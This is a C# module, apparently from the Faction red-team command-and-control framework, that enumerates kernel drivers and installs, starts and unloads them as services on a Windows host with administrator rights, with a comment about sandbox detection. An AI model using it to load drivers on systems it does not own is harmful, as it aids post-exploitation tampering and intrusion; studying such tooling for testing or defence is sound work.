using Faction.Modules.Dotnet.Common;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace Faction.Modules.Dotnet.Commands
{
    class Driver : Command
    {
        [Flags]
        public enum SERVICE_CONTROL : uint
        {
            STOP = 0x00000001,
            PAUSE = 0x00000002,
            CONTINUE = 0x00000003,
            INTERROGATE = 0x00000004,
            SHUTDOWN = 0x00000005,
            PARAMCHANGE = 0x00000006,
            NETBINDADD = 0x00000007,
            NETBINDREMOVE = 0x00000008,
            NETBINDENABLE = 0x00000009,
            NETBINDDISABLE = 0x0000000A,
            DEVICEEVENT = 0x0000000B,
            HARDWAREPROFILECHANGE = 0x0000000C,
            POWEREVENT = 0x0000000D,
            SESSIONCHANGE = 0x0000000E
        }

        public enum SERVICE_STATE : uint
        {
            SERVICE_STOPPED = 0x00000001,
            SERVICE_START_PENDING = 0x00000002,
            SERVICE_STOP_PENDING = 0x00000003,
            SERVICE_RUNNING = 0x00000004,
            SERVICE_CONTINUE_PENDING = 0x00000005,
            SERVICE_PAUSE_PENDING = 0x00000006,
            SERVICE_PAUSED = 0x00000007
        }

        public enum SERVICE_ACCEPT : uint
        {
            STOP = 0x00000001,
            PAUSE_CONTINUE = 0x00000002,
            SHUTDOWN = 0x00000004,
            PARAMCHANGE = 0x00000008,
            NETBINDCHANGE = 0x00000010,
            HARDWAREPROFILECHANGE = 0x00000020,
            POWEREVENT = 0x00000040,
            SESSIONCHANGE = 0x00000080,
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SERVICE_STATUS
        {
            public int serviceType;
            public int currentState;
            public int controlsAccepted;
            public int win32ExitCode;
            public int serviceSpecificExitCode;
            public int checkPoint;
            public int waitHint;
        }

        public enum SCM_ACCESS : uint
        {
            SC_MANAGER_CONNECT = 0x00001,
            SC_MANAGER_CREATE_SERVICE = 0x00002,
            SC_MANAGER_ENUMERATE_SERVICE = 0x00004,
            SC_MANAGER_LOCK = 0x00008,
            SC_MANAGER_QUERY_LOCK_STATUS = 0x00010,
            SC_MANAGER_MODIFY_BOOT_CONFIG = 0x00020,
            SC_MANAGER_ALL_ACCESS = ACCESS_MASK.STANDARD_RIGHTS_REQUIRED |
                SC_MANAGER_CONNECT |
                SC_MANAGER_CREATE_SERVICE |
                SC_MANAGER_ENUMERATE_SERVICE |
                SC_MANAGER_LOCK |
                SC_MANAGER_QUERY_LOCK_STATUS |
                SC_MANAGER_MODIFY_BOOT_CONFIG,
            GENERIC_READ = ACCESS_MASK.STANDARD_RIGHTS_READ |
                SC_MANAGER_ENUMERATE_SERVICE |
                SC_MANAGER_QUERY_LOCK_STATUS,
            GENERIC_WRITE = ACCESS_MASK.STANDARD_RIGHTS_WRITE |
                SC_MANAGER_CREATE_SERVICE |
                SC_MANAGER_MODIFY_BOOT_CONFIG,
            GENERIC_EXECUTE = ACCESS_MASK.STANDARD_RIGHTS_EXECUTE |
                SC_MANAGER_CONNECT | SC_MANAGER_LOCK,
            GENERIC_ALL = SC_MANAGER_ALL_ACCESS,
        }


        public enum ACCESS_MASK : uint
        {
            DELETE = 0x00010000,
            READ_CONTROL = 0x00020000,
            WRITE_DAC = 0x00040000,
            WRITE_OWNER = 0x00080000,
            SYNCHRONIZE = 0x00100000,

            STANDARD_RIGHTS_REQUIRED = 0x000F0000,

            STANDARD_RIGHTS_READ = 0x00020000,
            STANDARD_RIGHTS_WRITE = 0x00020000,
            STANDARD_RIGHTS_EXECUTE = 0x00020000,

            STANDARD_RIGHTS_ALL = 0x001F0000,

            SPECIFIC_RIGHTS_ALL = 0x0000FFFF,

            ACCESS_SYSTEM_SECURITY = 0x01000000,

            MAXIMUM_ALLOWED = 0x02000000,

            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000,
            GENERIC_EXECUTE = 0x20000000,
            GENERIC_ALL = 0x10000000,

            DESKTOP_READOBJECTS = 0x00000001,
            DESKTOP_CREATEWINDOW = 0x00000002,
            DESKTOP_CREATEMENU = 0x00000004,
            DESKTOP_HOOKCONTROL = 0x00000008,
            DESKTOP_JOURNALRECORD = 0x00000010,
            DESKTOP_JOURNALPLAYBACK = 0x00000020,
            DESKTOP_ENUMERATE = 0x00000040,
            DESKTOP_WRITEOBJECTS = 0x00000080,
            DESKTOP_SWITCHDESKTOP = 0x00000100,

            WINSTA_ENUMDESKTOPS = 0x00000001,
            WINSTA_READATTRIBUTES = 0x00000002,
            WINSTA_ACCESSCLIPBOARD = 0x00000004,
            WINSTA_CREATEDESKTOP = 0x00000008,
            WINSTA_WRITEATTRIBUTES = 0x00000010,
            WINSTA_ACCESSGLOBALATOMS = 0x00000020,
            WINSTA_EXITWINDOWS = 0x00000040,
            WINSTA_ENUMERATE = 0x00000100,
            WINSTA_READSCREEN = 0x00000200,

            WINSTA_ALL_ACCESS = 0x0000037F
        }

        public enum SERVICE_ACCESS : uint
        {
            SERVICE_QUERY_CONFIG = 0x00001,
            SERVICE_CHANGE_CONFIG = 0x00002,
            SERVICE_QUERY_STATUS = 0x00004,
            SERVICE_ENUMERATE_DEPENDENTS = 0x00008,
            SERVICE_START = 0x00010,
            SERVICE_STOP = 0x00020,
            SERVICE_PAUSE_CONTINUE = 0x00040,
            SERVICE_INTERROGATE = 0x00080,
            SERVICE_USER_DEFINED_CONTROL = 0x00100,
            SERVICE_ALL_ACCESS = (ACCESS_MASK.STANDARD_RIGHTS_REQUIRED |
                SERVICE_QUERY_CONFIG |
                SERVICE_CHANGE_CONFIG |
                SERVICE_QUERY_STATUS |
                SERVICE_ENUMERATE_DEPENDENTS |
                SERVICE_START |
                SERVICE_STOP |
                SERVICE_PAUSE_CONTINUE |
                SERVICE_INTERROGATE |
                SERVICE_USER_DEFINED_CONTROL),

            GENERIC_READ = ACCESS_MASK.STANDARD_RIGHTS_READ |
                SERVICE_QUERY_CONFIG |
                SERVICE_QUERY_STATUS |
                SERVICE_INTERROGATE |
                SERVICE_ENUMERATE_DEPENDENTS,

            GENERIC_WRITE = ACCESS_MASK.STANDARD_RIGHTS_WRITE |
                SERVICE_CHANGE_CONFIG,

            GENERIC_EXECUTE = ACCESS_MASK.STANDARD_RIGHTS_EXECUTE |
                SERVICE_START |
                SERVICE_STOP |
                SERVICE_PAUSE_CONTINUE |
                SERVICE_USER_DEFINED_CONTROL,

            ACCESS_SYSTEM_SECURITY = ACCESS_MASK.ACCESS_SYSTEM_SECURITY,
            DELETE = ACCESS_MASK.DELETE,
            READ_CONTROL = ACCESS_MASK.READ_CONTROL,
            WRITE_DAC = ACCESS_MASK.WRITE_DAC,
            WRITE_OWNER = ACCESS_MASK.WRITE_OWNER,
        }

        public enum SERVICE_ERROR
        {
#pragma warning disable CA1712 
            SERVICE_ERROR_IGNORE = 0x00000000,
            SERVICE_ERROR_NORMAL = 0x00000001,
            SERVICE_ERROR_SEVERE = 0x00000002,
            SERVICE_ERROR_CRITICAL = 0x00000003,
#pragma warning restore CA1712
        }

        public enum SERVICE_TYPE : uint
        {
            SERVICE_KERNEL_DRIVER = 0x00000001,
            SERVICE_FILE_SYSTEM_DRIVER = 0x00000002,
            SERVICE_WIN32_OWN_PROCESS = 0x00000010,
            SERVICE_WIN32_SHARE_PROCESS = 0x00000020,
            SERVICE_INTERACTIVE_PROCESS = 0x00000100,
        }

        public enum SERVICE_START : uint
        {
            SERVICE_BOOT_START = 0x00000000,
            SERVICE_SYSTEM_START = 0x00000001,
            SERVICE_AUTO_START = 0x00000002,
            SERVICE_DEMAND_START = 0x00000003,
            SERVICE_DISABLED = 0x00000004,
        }


        [DllImport("psapi.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool EnumDeviceDrivers(
            [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.FunctionPtr)] [In][Out] UIntPtr[] ddAddresses,
            UInt32 arraySizeBytes,
            [MarshalAs(UnmanagedType.U4)] out UInt32 bytesNeeded
            );

        [DllImport("psapi.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int GetDeviceDriverFileName(
            UIntPtr ddAddress,
            StringBuilder ddBaseName,
            int baseNameStringSizeChars
        );

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr OpenSCManager(
            string machineName,
            string databaseName,
            uint dwAccess);

        // http://pinvoke.net/default.aspx/advapi32/CreateService.html
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr CreateService(
            IntPtr hSCManager,
            string lpServiceName,
            string lpDisplayName,
            uint dwDesiredAccess,
            uint dwServiceType,
            uint dwStartType,
            uint dwErrorControl,
            string lpBinaryPathName,
            string lpLoadOrderGroup,
            string lpdwTagId,
            string lpDependencies,
            string lpServiceStartName,
            string lpPassword);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool StartService(
            IntPtr hService,
            int dwNumServiceArgs,
            string[] lpServiceArgVectors);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr OpenService(
            IntPtr hSCManager,
            string lpServiceName,
            uint dwDesiredAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool ControlService(
            IntPtr hService,
            uint dwControl,
            ref SERVICE_STATUS lpServiceStatus);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteService(
            IntPtr hService);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseServiceHandle(
            IntPtr hSCObject);

        private void EnumerateDeviceDrivers(List<string> deviceDrivers)
        {
            bool success;
            UInt32 driverArraySize;
            UInt32 driverArraySizeBytes;
            UIntPtr[] ddAddresses;
            UInt32 driverArrayBytesNeeded;

            success = EnumDeviceDrivers(null, 0, out driverArrayBytesNeeded);

            if (!success)
            {
                throw new ArgumentException("Call to EnumDeviceDrivers Failed.");
            }

            if (driverArrayBytesNeeded == 0)
            {
                throw new ArgumentException("No drivers found on system, possibly caught by a sandbox.");
            }

            driverArraySize = driverArrayBytesNeeded / 4;
            driverArraySizeBytes = driverArrayBytesNeeded;
            ddAddresses = new UIntPtr[driverArraySize];
            success = EnumDeviceDrivers(ddAddresses, driverArraySizeBytes, out driverArrayBytesNeeded);

            if (!success)
            {
                throw new ArgumentException("Call to EnumDeviceDrivers Failed.");
            }

            // Get the Base Name of all device drivers present
            for (int i = 0; i < driverArraySize; i++)
            {
                StringBuilder sb = new StringBuilder(1024);
                int result = GetDeviceDriverFileName(ddAddresses[i], sb, sb.Capacity);
                if (result != 0)
                {
                    deviceDrivers.Add(sb.ToString());
                }
            }
        }

        private bool InstallAndStartDriver(string driverPath, string serviceName)
        {
            IntPtr SC_MANAGER = IntPtr.Zero;
            IntPtr SC_SERVICE = IntPtr.Zero;
            try
            {
                SC_MANAGER = OpenSCManager(null, null, (uint)SCM_ACCESS.SC_MANAGER_CREATE_SERVICE);
                SC_SERVICE = CreateService(
                    SC_MANAGER,
                    serviceName,
                    serviceName,
                    (uint)SERVICE_ACCESS.SERVICE_ALL_ACCESS, // Service All Access Permission
                    (uint)SERVICE_TYPE.SERVICE_KERNEL_DRIVER, // Kernel Driver
                    (uint)SERVICE_START.SERVICE_DEMAND_START, // Service Demand Start
                    (uint)SERVICE_ERROR.SERVICE_ERROR_NORMAL, // Error Control - don't log the error TODO - fix
                    driverPath,
                    null,
                    null,
                    null,
                    null,
                    null
                    );
                if (SC_SERVICE == null)
                {
                    throw new Exception("Failed to create service.");
                }
                if (!StartService(SC_SERVICE, 0, null))
                {
                    throw new Exception("Failed to start service.");
                }
            }
            catch (Exception e)
            {
                throw e;
            }
            finally
            {
                if (SC_SERVICE != IntPtr.Zero)
                {
                    CloseServiceHandle(SC_SERVICE);
                }
                if (SC_MANAGER != IntPtr.Zero)
                {
                    CloseServiceHandle(SC_MANAGER);
                }
            }

            return true;
        }

        private bool StopAndUnloadDriver(string serviceName)
        {
            IntPtr SC_MANAGER = IntPtr.Zero;
            IntPtr SC_SERVICE = IntPtr.Zero;
            try
            {
                SC_MANAGER = OpenSCManager(null, null, (uint)SCM_ACCESS.SC_MANAGER_ALL_ACCESS);
                SC_SERVICE = OpenService(SC_MANAGER, serviceName, (uint) SERVICE_ACCESS.SERVICE_STOP | (uint) SERVICE_ACCESS.DELETE | (uint)SERVICE_ACCESS.SERVICE_STOP);
                if(SC_SERVICE == IntPtr.Zero)
                {
                    throw new Exception("Unable to get a handle on service.");
                }
                SERVICE_STATUS serviceStatus = new SERVICE_STATUS();
                ControlService(SC_SERVICE, (uint)SERVICE_CONTROL.STOP, ref serviceStatus);
                if (!DeleteService(SC_SERVICE))
                {
                    throw new Exception("Unable to delete service.");
                }
            }
            catch (Exception e)
            {
                throw e;
            }
            finally
            {
                if (SC_SERVICE != IntPtr.Zero)
                {
                    CloseServiceHandle(SC_SERVICE);
                }
                if (SC_MANAGER != IntPtr.Zero)
                {
                    CloseServiceHandle(SC_MANAGER);
                }
            }

            return true;
        }

        private void DriverPathValidation(string driverPath)
        {
            if (!File.Exists(driverPath))
            {
                throw new ArgumentException("Invalid driver path for DriverPath parameter.");
            }
        }

        public override string Name { get { return "driver"; } }

        public override CommandOutput Execute(Dictionary<string, string> Parameters = null)
        {
            CommandOutput output = new CommandOutput();
            bool isElevated;
            List<string> deviceDrivers = new List<string>();

            // Check privileges, admin is required to work with drivers for this module
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            if (!isElevated)
            {
                output.Complete = true;
                output.Success = false;
                output.Message = "Insufficent privileges to execute module.";
                return output;
            }

            try
            {
                string operation = "Enumerate"; //set a default to Enumerate
                string driverPath = string.Empty;
                string method = string.Empty;
                string serviceName = string.Empty;
                operation = Parameters["Operation"];

                switch (operation)
                {
                    case "Enumerate":
                        EnumerateDeviceDrivers(deviceDrivers);
                        output.Message = JsonConvert.SerializeObject(deviceDrivers);
                        output.Success = true;
                        break;
                    case "Install":
                        driverPath = Parameters["DriverPath"];
                        serviceName = Parameters["ServiceName"];
                        output.Message = "";
                        if (driverPath == string.Empty)
                        {
                            throw new ArgumentException("DriverPath is empty.");
                        }
                        if (serviceName == string.Empty)
                        {
                            throw new ArgumentException("ServiceName is empty.");
                        }
                        DriverPathValidation(driverPath);
                        output.Success = InstallAndStartDriver(driverPath, serviceName);
                        break;
                    case "Call":
                        driverPath = Parameters["DriverPath"];
                        method = Parameters["Method"];
                        DriverPathValidation(driverPath);
                        break;
                    case "Unload":
                        serviceName = Parameters["ServiceName"];
                        output.Success = StopAndUnloadDriver(serviceName);
                        break;
                    default:
                        break;
                }
            }
            catch (Exception e)
            {
                output.Message = e.Message;
                output.Success = false;
            }
            output.Complete = true;
            return output;
        }

        /// <summary>
        /// Pinvoke Signatures Below, needed to call CreateFileA to load the driver
        /// Needed to then call deviceIOControl to interact with it
        /// https://www.pinvoke.net/default.aspx/kernel32/CreateFile.html
        /// </summary>
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateFile(
             [MarshalAs(UnmanagedType.LPTStr)] string filename,
             [MarshalAs(UnmanagedType.U4)] FileAccess access,
             [MarshalAs(UnmanagedType.U4)] FileShare share,
             IntPtr securityAttributes, // optional SECURITY_ATTRIBUTES struct or IntPtr.Zero
             [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition,
             [MarshalAs(UnmanagedType.U4)] FileAttributes flagsAndAttributes,
             IntPtr templateFile); //ignored on file open

        /// <summary>
        /// https://www.pinvoke.net/default.aspx/kernel32/DeviceIoControl.html
        /// </summary>
        /// <param name="hDevice"></param>
        /// <param name="dwIoControlCode"></param>
        /// <param name="InBuffer"></param>
        /// <param name="nInBufferSize"></param>
        /// <param name="OutBuffer"></param>
        /// <param name="nOutBufferSize"></param>
        /// <param name="pBytesReturned"></param>
        /// <param name="lpOverlapped"></param>
        /// <returns></returns>
        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool DeviceIoControl(
                IntPtr hDevice,
                uint dwIoControlCode,
                ref long InBuffer,
                int nInBufferSize,
                ref long OutBuffer,
                int nOutBufferSize,
                ref int pBytesReturned,
                [In] ref NativeOverlapped lpOverlapped);

    }
}

